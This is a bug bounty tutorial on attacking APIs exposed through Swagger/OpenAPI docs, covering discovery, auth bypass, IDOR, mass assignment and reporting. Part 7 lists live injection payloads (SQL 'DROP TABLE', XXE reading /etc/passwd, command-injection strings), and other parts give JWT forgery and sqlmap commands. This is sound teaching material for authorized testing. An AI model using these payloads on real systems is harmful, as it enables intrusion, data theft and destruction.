================================================================================
              SWAGGER / OpenAPI — BUG BOUNTY HUNTER'S DEEP GUIDE
                   Think Deep. Hunt Smart. Chase Impact.
================================================================================

This guide is written for authorized bug bounty hunters testing targets within
scope. Everything here is for legal, ethical security research only.

================================================================================
  PART 1 — THE MINDSET: HOW TO THINK ABOUT SWAGGER IN BUG BOUNTY
================================================================================

Most hunters see Swagger UI and think "cool, free docs." Wrong mindset.
Think of Swagger as the blueprint of the application's attack surface — handed
to you on a silver platter. Every endpoint listed is a door. Your job is to
figure out which ones are unlocked, which ones are mislabeled, and which ones
lead somewhere the developers never intended you to go.

Ask yourself these questions the moment you find a Swagger instance:

  - Is this Swagger UI exposed publicly? Should it be?
  - Is the API documented here the SAME as the API being used in production?
  - Are there endpoints documented here that are NOT linked from the frontend?
  - Does authentication actually protect every endpoint, or just the ones the
    developer remembered to lock?
  - Are there admin, internal, or deprecated endpoints buried in the spec?
  - What data types does this API accept — and what happens if I break them?

The answer to these questions is where your findings live.

================================================================================
  PART 2 — DISCOVERY: FINDING SWAGGER IN THE WILD
================================================================================

Swagger doesn't always announce itself. You need to find it first.

--- Common Swagger UI Paths ---

/swagger
/swagger-ui
/swagger-ui.html
/swagger-ui/index.html
/swagger/index.html
/api/swagger
/api/swagger-ui
/api/swagger-ui.html
/api/swagger/index.html
/api/docs
/api/v1/docs
/api/v2/docs
/api/v3/docs
/docs
/documentation
/apidocs
/api-docs
/v1/api-docs
/v2/api-docs
/v3/api-docs
/openapi
/openapi.json
/openapi.yaml
/swagger.json
/swagger.yaml
/api/swagger.json
/api/swagger.yaml
/api/openapi.json
/api/openapi.yaml
/.well-known/openapi
/internal/swagger
/admin/swagger
/manage/swagger
/actuator (Spring Boot — can expose API info)
/actuator/mappings
/actuator/swagger-ui

--- Discovery via Google Dorks ---

inurl:swagger-ui.html
inurl:/api/swagger
inurl:/api-docs
site:target.com inurl:swagger
site:target.com filetype:json "swagger"
site:target.com "openapi": "3."

--- Discovery via JS Files ---

Download and grep all JS files for hidden API endpoints and Swagger refs:

  grep -r "swagger" *.js
  grep -r "api-docs" *.js
  grep -r "openapi" *.js
  grep -rE "/v[0-9]+/(api|docs|swagger)" *.js

Tools: LinkFinder, waybackurls, gau, hakrawler

--- Discovery via Wayback Machine ---

  waybackurls target.com | grep -i swagger
  waybackurls target.com | grep -i api-docs
  gau target.com | grep -iE "(swagger|openapi|api-docs)"

--- Subdomain Hunting ---

Many programs expose Swagger on internal or staging subdomains:

  api.target.com/swagger
  dev.target.com/swagger
  staging.target.com/api-docs
  internal.target.com/swagger-ui
  admin-api.target.com/docs

Use: subfinder, amass, assetfinder — then probe all subdomains for Swagger paths.

================================================================================
  PART 3 — READING THE SPEC: WHAT TO LOOK FOR
================================================================================

Once you have the Swagger JSON or YAML, download it locally and read it
carefully before touching a single endpoint. This is your map.

  curl https://target.com/api-docs > swagger.json
  curl https://target.com/swagger.yaml > swagger.yaml

Things to look for in the raw spec:

  1. HIDDEN / UNDOCUMENTED ENDPOINTS
     Look for paths that seem sensitive:
     /admin, /internal, /debug, /test, /dev, /management,
     /users/{id}/delete, /config, /reset, /export, /backup

  2. DEPRECATED ENDPOINTS
     Look for tags like "deprecated: true" — these often skip newer auth checks.

  3. AUTHENTICATION MARKERS
     Check which endpoints have "security: []" (empty = no auth required).
     In Swagger 2.0, missing "security" field may also mean unauthenticated.

  4. PARAMETER TYPES
     Look for parameters that accept: file uploads, free-form objects,
     base64 blobs, XML bodies, or raw JSON — all high-value injection targets.

  5. SERVER LIST (OpenAPI 3.x)
     The "servers" field may list internal hostnames, staging URLs, or
     localhost addresses — these reveal infrastructure details.

  6. EXAMPLE VALUES
     Sometimes developers leave real tokens, IDs, or internal data in
     example fields. Read every example object carefully.

  7. RESPONSE SCHEMAS
     Look at what data the API claims to return. If a user object returns
     "role", "isAdmin", "internalId" — those are fields to probe for in
     responses even if not shown in the UI.

================================================================================
  PART 4 — AUTHENTICATION BYPASS TECHNIQUES
================================================================================

This is where impact lives. A Swagger UI that requires login to VIEW docs
often does NOT enforce auth the same way on every endpoint. Test each one.

--- Technique 1: Unauthenticated Access to Authenticated Endpoints ---

Try every endpoint WITHOUT a token first. Many apps protect the frontend
but forget to guard backend routes.

  curl -X GET https://api.target.com/v1/admin/users
  curl -X GET https://api.target.com/v1/users/export

--- Technique 2: Remove or Tamper the Auth Header ---

If you have a valid token, try:
  - Removing the Authorization header entirely
  - Sending an empty token: Authorization: Bearer
  - Sending a null token: Authorization: Bearer null
  - Sending an expired token (keep old tokens when testing)
  - Sending a token from a lower-privileged account to a privileged endpoint

--- Technique 3: Version Switching ---

If v2 requires auth, try the same endpoint on v1:

  /api/v2/admin/users  →  /api/v1/admin/users
  /api/v2/export       →  /api/v1/export

Older versions often have weaker or missing auth.

--- Technique 4: HTTP Method Switching ---

If GET /admin/users requires auth, try:
  POST /admin/users
  PUT  /admin/users
  HEAD /admin/users
  OPTIONS /admin/users

Some frameworks only apply auth middleware to specific HTTP methods.

--- Technique 5: Path Manipulation Bypasses ---

  /api/v1/admin/users
  /api/v1/ADMIN/users        (uppercase)
  /api/v1/admin/users/       (trailing slash)
  /api/v1/./admin/users      (dot segment)
  /api/v1/admin/../admin/users
  /api/v1/%61dmin/users      (URL encoding)
  /api/v1/admin%2Fusers      (encoded slash)

--- Technique 6: JWT Manipulation ---

If the API uses JWTs:

  - Decode the JWT at jwt.io
  - Try algorithm confusion: change "alg": "RS256" to "alg": "HS256"
    and sign with the public key as secret
  - Try "alg": "none" — remove signature entirely
  - Try modifying claims: "role": "user" → "role": "admin"
  - Try modifying "sub" (user ID) to access other accounts (IDOR via JWT)

--- Technique 7: API Key in Alternate Locations ---

If the API requires an API key, try placing it in different spots:

  Header:      X-API-Key: <key>
  Header:      Authorization: Bearer <key>
  Header:      Authorization: ApiKey <key>
  Query param: ?api_key=<key>
  Query param: ?apikey=<key>
  Query param: ?token=<key>
  Body param:  {"api_key": "<key>"}

================================================================================
  PART 5 — BROKEN OBJECT LEVEL AUTHORIZATION (BOLA / IDOR)
================================================================================

BOLA is the #1 finding in API bug bounty programs. Swagger hands you every
object-referencing endpoint on a plate. This is how you exploit it.

--- Identifying IDOR-prone Endpoints ---

Look in the spec for any endpoint with path parameters like:
  /users/{userId}
  /orders/{orderId}
  /documents/{docId}
  /invoices/{invoiceId}
  /accounts/{accountId}

--- Testing IDOR ---

  1. Create two accounts (attacker + victim) if self-registration is in scope.
  2. Log actions as victim — note the IDs used.
  3. Switch to attacker token and replay requests with victim's IDs.
  4. Try numeric enumeration: change 1001 → 1002 → 1003
  5. Try GUIDs — if sequential or timestamp-based, they may be guessable.
  6. Try swapping resource types: /users/123 → /admins/123

--- Chained IDOR for Higher Impact ---

Read-only IDOR = Medium. But chain it:
  - IDOR read → reveals PII = High
  - IDOR write → modify another user's data = High/Critical
  - IDOR delete → delete another user's account = Critical
  - IDOR on admin endpoint → privilege escalation = Critical

================================================================================
  PART 6 — BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)
================================================================================

BFLA = accessing functionality you shouldn't have. Swagger shows you ALL
functions — including admin ones. Test them with a non-admin token.

  curl -X DELETE https://api.target.com/v1/users/999 \
    -H "Authorization: Bearer <regular_user_token>"

  curl -X GET https://api.target.com/v1/admin/all-users \
    -H "Authorization: Bearer <regular_user_token>"

  curl -X POST https://api.target.com/v1/users/999/promote \
    -H "Authorization: Bearer <regular_user_token>" \
    -d '{"role": "admin"}'

If any of these work — that's a critical BFLA finding.

================================================================================
  PART 7 — INJECTION ATTACKS VIA SWAGGER ENDPOINTS
================================================================================

Swagger tells you exactly which parameters exist and what type they expect.
Use that to target your injection precisely.

--- SQL Injection ---

Target string parameters in GET/POST endpoints:
  ?search=test' OR '1'='1
  ?id=1 AND SLEEP(5)--
  ?filter=1; DROP TABLE users--

Use SQLMap against specific Swagger endpoints:
  sqlmap -u "https://api.target.com/v1/users?id=1" --batch --dbs

--- NoSQL Injection ---

For MongoDB-backed APIs (common in Node.js stacks):
  {"username": {"$gt": ""}}
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"$where": "sleep(5000)"}

--- SSTI (Server-Side Template Injection) ---

In string fields:
  {{7*7}}
  ${7*7}
  <%= 7*7 %>
  #{7*7}

If you get 49 back — pursue RCE.

--- XML Injection / XXE ---

If an endpoint accepts XML content type:

  Content-Type: application/xml

  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <data>&xxe;</data>

--- Command Injection ---

In parameters that look like they interact with the OS (file names, paths, etc.):
  ; ls -la
  | whoami
  `id`
  $(id)

================================================================================
  PART 8 — MASS ASSIGNMENT
================================================================================

Swagger response schemas reveal ALL fields an object has — including ones
the API doesn't intend you to set. Try sending those extra fields in POST/PUT.

Example: Swagger shows user object has fields:
  { "username", "email", "role", "isAdmin", "credits" }

But the registration endpoint only asks for username and email. Try:

  POST /api/v1/register
  {
    "username": "attacker",
    "email": "attacker@evil.com",
    "role": "admin",
    "isAdmin": true,
    "credits": 99999
  }

If the server blindly binds all incoming JSON fields to the object model,
you just became an admin. This is mass assignment — a critical finding.

================================================================================
  PART 9 — RATE LIMITING & RESOURCE ABUSE
================================================================================

Swagger shows you endpoints that cost the server money or compute:
  - File upload and processing endpoints
  - Email/SMS sending endpoints
  - Report generation endpoints
  - Password reset endpoints
  - Search endpoints with heavy queries

Test these for:
  - Missing rate limiting (send 1000 requests rapidly — does it stop you?)
  - Account enumeration via timing differences on /forgot-password
  - Sending SMS/email to arbitrary numbers/addresses (abuse potential)

================================================================================
  PART 10 — SENSITIVE DATA EXPOSURE
================================================================================

--- Swagger UI Itself Exposed in Production ---
This is a valid finding. Swagger UI in production exposes:
  - Internal API structure
  - Parameter names and types
  - Business logic flows
  - Sometimes: internal server addresses, tokens in examples

Report it with clear impact: "An unauthenticated attacker can map the entire
API surface and use this knowledge to target attacks precisely."

--- Verbose Error Messages ---
Send malformed requests and read errors carefully:
  - Stack traces reveal tech stack, framework versions, file paths
  - Database errors reveal schema details
  - Framework errors may include internal hostnames

--- Response Filtering Issues ---
Even if a field isn't SHOWN in the response by default, add it to a
query/filter parameter:
  ?fields=id,email,role,passwordHash,internalNotes
  ?include=sensitiveData

Some APIs return fields if you explicitly ask — even ones you shouldn't see.

================================================================================
  PART 11 — BUSINESS LOGIC FLAWS
================================================================================

Swagger gives you the full business flow. Read it as a story and find the
plot holes.

Examples of logic flaws to hunt:
  - Can you skip a required step in a multi-step process?
    (e.g., place an order without payment confirmation?)
  - Can you apply a discount code unlimited times?
  - Can you transfer funds to yourself from a different account?
  - Can you set a negative quantity in an order?
  - Can you access resources in a "deleted" state?
  - Can you reuse a one-time token (password reset, email verification)?

These require thinking, not scanning. Read the workflow, map it, then break it.

================================================================================
  PART 12 — TOOLS AND COMMANDS REFERENCE
================================================================================

--- Downloading and Parsing the Spec ---
  curl -s https://target.com/api-docs | python3 -m json.tool
  curl -s https://target.com/swagger.yaml
  python3 -c "import yaml,json,sys; print(json.dumps(yaml.safe_load(sys.stdin)))" < swagger.yaml

--- Extracting All Endpoints from Swagger JSON ---
  cat swagger.json | python3 -c "
  import json,sys
  spec = json.load(sys.stdin)
  paths = spec.get('paths', {})
  for path, methods in paths.items():
      for method in methods:
          print(method.upper(), path)
  "

--- Converting Swagger to Postman Collection ---
  Use: https://www.postman.com/tools (import OpenAPI spec directly)
  Or: openapi-to-postman CLI tool

--- Fuzzing Endpoints with ffuf ---
  ffuf -u https://api.target.com/v1/FUZZ -w wordlist.txt -mc 200,201,401,403

--- Scanning with nuclei (Swagger templates) ---
  nuclei -u https://target.com -t exposures/apis/swagger-api.yaml
  nuclei -u https://target.com -t exposures/apis/

--- Automated API Security Testing ---
  - 42crunch/api-security-audit (static analysis of swagger spec)
  - OWASP ZAP with OpenAPI import
  - Burp Suite — import Swagger spec to populate target map

--- JWT Testing ---
  jwt_tool <token> -M at        (attack modes)
  jwt_tool <token> -X a         (alg:none attack)
  jwt_tool <token> -X s         (self-signed)

================================================================================
  PART 13 — REPORTING FOR MAXIMUM IMPACT
================================================================================

Don't just report "Swagger UI is exposed." Frame it with demonstrated impact.

BAD:  "Swagger UI is publicly accessible at /swagger-ui.html"

GOOD: "The Swagger UI is publicly accessible without authentication at
       /swagger-ui.html, exposing the full API surface including 47 endpoints.
       Using this documentation, I was able to identify and exploit an
       unauthenticated BOLA vulnerability at /api/v1/users/{id} which allows
       any unauthenticated user to retrieve full profile data (including PII:
       name, email, phone, address) of any registered user by incrementing
       the numeric user ID."

Always:
  - Provide a full reproduction steps (curl commands preferred)
  - Show the impact on a real user or data
  - Attach screenshots or response output as evidence
  - Calculate CVSS score and justify it
  - Mention what the attacker gains (data, access, money, persistence)

================================================================================
  FINAL THOUGHT: THE SWAGGER HUNTER APPROACH
================================================================================

Most hunters run a scan and call it a day. You read the spec. You think about
the business. You chain findings. You push every endpoint, every parameter,
every auth header. You understand that the spec is a promise the developer
made — and your job is to find every place they broke that promise.

Swagger is not just an API explorer. It is a treasure map.
Read it that way. Hunt it that way. Report it with IMPACT.

================================================================================
  This guide is for authorized bug bounty testing only.
  Always operate within your program's defined scope.
================================================================================
